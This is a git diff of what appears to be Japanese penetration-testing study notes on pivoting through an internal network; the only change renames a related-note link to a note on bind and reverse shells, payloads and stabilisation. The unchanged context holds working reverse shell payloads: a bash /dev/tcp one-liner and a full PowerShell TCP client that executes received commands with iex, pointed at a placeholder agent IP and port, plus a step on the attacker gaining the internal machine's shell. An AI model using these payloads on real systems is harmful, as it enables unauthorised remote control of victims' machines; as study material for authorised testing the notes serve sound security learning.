@@ -243,7 +243,7 @@ bash -i >& /dev/tcp/<agent_local_IP>/<agent_listen_port> 0>&1
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<agent_local_IP>',<agent_listen_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 - `agent_local_IP`には内部NWインターフェースのIPを指定
-- 関連ノート：[What is the shell](../../Common/What%20is%20the%20shell.md)
+- 関連ノート：[Bind & Reverse Shell・ペイロード・安定化手法](../../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md)
 
 4. 攻撃者のマシンでローカルNW側のマシンのリバースシェルを確立される
 
